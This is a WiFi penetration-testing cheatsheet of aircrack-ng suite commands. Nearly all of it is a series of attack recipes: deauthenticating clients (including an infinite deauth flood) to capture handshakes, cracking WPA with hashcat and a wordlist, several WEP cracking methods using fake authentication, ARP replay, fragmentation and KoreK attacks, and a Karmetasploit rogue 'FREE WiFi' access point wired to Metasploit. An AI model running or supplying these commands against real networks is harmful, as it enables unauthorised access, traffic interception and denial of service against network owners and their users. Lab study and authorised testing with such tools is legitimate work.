

----
##  [+]  Airmon-ng-Cheatsheet.sh


##  [+]  Airmon-ng - put interface into monitor mode
airmon-ng start wlan0


##  [+]  Airmon-ng - listen for all nearby beacon frames to get target BSSID
airodump-ng wlan0 --band abg



##  [+]  Airmon-ng - Perfom channel hopping among various channels. Scan 5GHz
airodump-ng --band a mon0



##  [+]  Airmon-ng - Monitor specific channel(s)
airodump-ng -c <channel> mon0
airodump-ng -c <chan1>,<chan2> mon0  # Monitoring with channel hopping on specified channels



##  [+]  Airmon-ng - Monitor specific AP, write dump to file
airodump-ng -c <channel> --bssid <MAC_AP> -w <capture_file> mon0



##  [+]  Airmon-ng - Generate Graph Images of Monitored WiFi
##  [?]  Generate graph of WiFi connections around (APs and clients connected to APs)

airodump-ng -r targetnet.pcap -w TARGETNET
airgraph-ng -i TARGETNET-01.csv -g CAPR -o targetnet-connections.png



##  [+]  Airmon-ng -Generate graph of probe requests sent by devices around
##  [?]  (Very interesting to rebuild devices' PNLs)
airodump-ng -r targetnet.pcap -w TARGETNET
airgraph-ng -i TARGETNET-01.csv -g CPG -o targetnet-pnl.png


##  [?]  Alternative with BeaconGraph: https://github.com/daddycocoaman/BeaconGraph


##  [+]  Kismet - Monitor WiFi Networks
kismet -c mon0


##  [+]  Airmon-ng - Find Hidden SSID
airodump-ng –c <channel> --bssid <MAC_AP> mon0
aireplay-ng -0 20 –a <MAC_AP> mon0



##  [+]  Airmon-ng - Set 5 GHz channel**
iwconfig wlan0 channel 149



##  [+]  Airmon-ng - Start listening for the handshake
airodump-ng -c 149 --bssid P4:E4:E4:92:60:71 -w cap01.cap wlan0



##  [+]  Airmon-ng - Deauth a connected client to force a handshake
aireplay-ng -D -0 2 -a 9C:5C:8E:C9:AB:C0 -c P4:E4:E4:92:60:71 wlan0




##  [+]  Airmon-ng - Deauthentication / Disassociation Attack:
aireplay-ng --deauth 0 -c <MAC_target> -a <MAC_AP> mon0  # Infinite amount of deauth attacks
aireplay-ng --deauth 5 -c <MAC_target> -a <MAC_AP> mon0  # 5 deauth attacks



##  [+]  Airmon-ng - Convert cap to hccapx
aircrack-ng -J file.cap capture.hccap


##  [+]  Airmon-ng - Crack with hashcat
hashcat.exe -m 2500 capture.hccapx rockyou.txt





##  [+]  Airmon-ng - airgraph-ng

airgraph-ng -i filename.csv -g CAPR -o outputfilename.png

eog outputfilename.png

airgraph-ng -i filename.csv -g CPG -o outputfilename.png

eog outputfilename.png



##  [+]  Airmon-ng - airdecap-ng

airdecap-ng -b (vic ap) outputfilename.cap

wireshark outputfilename.cap

airdecap-ng -w (WEP KEY) (capturefile.cap)

wireshark capturefile-DEC.cap

airdecap-ng -e (ESSID VIC) -p (WPA PASSWORD) (capturefile.cap)

wireshark capturefile-dec.cap




##  [+]  Airmon-ng - Cracking WPA

airmon-ng start wlan0

airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon

aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {disassociation attack}

aircrack-ng -0 -w (wordlist path) (caputure filename)


##  [+]  Airmon-ng - Cracking WEP with Connected Clients



airmon-ng start wlan0 ( channel)

airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon

aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}

aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {disassociation attack}

aireplay-ng -3 -b (AP MAC) -h (OUR MAC) wlan0mon {ARP replay attack}


##  [+]  Airmon-ng - Cracking WEP via a Client

airmon-ng start wlan0 (channel)
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}
aireplay-ng -2 -b (AP MAC) -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon
aireplay-ng -2 -r (replay cap file) wlan0mon {inject using cap file}
aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap
```

**ARP amplification**
```
airmon-ng start wlan0 ( channel)

airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon

aireplay-ng -1 500 -q 8 -a (AP MAC) wlan0mon

aireplay-ng -5 -b (AP MAC) -h (OUR MAC) wlan0mon

packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k 255.255.255.255 -l 255.255.255.255 -y (FRAGMENT.xor) -w (filename.cap)

tcpdump -n -vvv -e -s0 -r (replay_dec.#####.cap)

packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k (destination IP) -l (source IP) -y (FRAGMENT.xor) -w (filename.cap)

aireplay-ng -2 -r (filename.cap) wlan0mon



##  [+]  Airmon-ng - Cracking WEP 
##        with shared key AUTH

airmon-ng start wlan0 ( channel)

airodump-ng -c (channel) –bssid (AP MAC) -w (filename) 

wlan0mon

aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) 

wlan0mon {fake authentication}

aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {deauthentication attack}

aireplay-ng -1 60 -e (ESSID) -y (sharedkeyfile) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication /w PRGA xor file}

aireplay-ng -3 -b (AP MAC) -h (OUR MAC) wlan0mon {ARP replay attack}

aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {deauthentication attack}

aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap


##  [+]  Airmon-ng - Cracking a Clientless WEP (FRAG AND KOREK)


##  [+]  Airmon-ng - FRAG

airmon-ng start wlan0 (channel)

airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon

aireplay-ng -1 60 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}

aireplay-ng -5 (frag attack) -b (AP MAC) -h (OUR MAC) wlan0mon

packetforge-ng -0 -a (APMAC) -h (OUR MAC) -l 255.255.255.255 -k 255.255.255.255 -y (fragment filename) -w filename.cap

tcpdump -n -vvv -e -s0 -r filename.cap {TEST}

aireplay-ng -2 -r filename.cap wlan0mon


##  [+]  Airmon-ng - KOREK

aireplay-ng -4 -b (AP MAC) -h (OUR MAC) wlan0mon

tcpdump -s 0 -s -e -r replayfilename.cap

packetforge-ng -0 -a (APMAC) -h (OUR MAC) -l 255.255.255.255(source IP) -k 255.255.255.255(dest IP) -y (fragmentfilename xor) -w filename.cap

aireplay-ng -2 -r filename.cap wlan0mon

aircrack-ng -0 filename.cap





##  [+]  Airmon-ng - Karmetasploit


airbase-ng -c (channel) -P -C 60 -e “FREE WiFi” -v wlan0mon

ifconfig at0 up 10.0.0.1/24

mkdir -p /var/run/dhcpd

chown -R dhcpd:dhcpd /var/run/dhcpd

touch /var/lib/dhcp3/dhcpd.leases

cat dhcpd.conf

touch /tmp/dhcp.log

chown dhcpd:dhcpd /tmp/dhcp.log

dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcp.log at0

msfconsole -r /root/karma.rc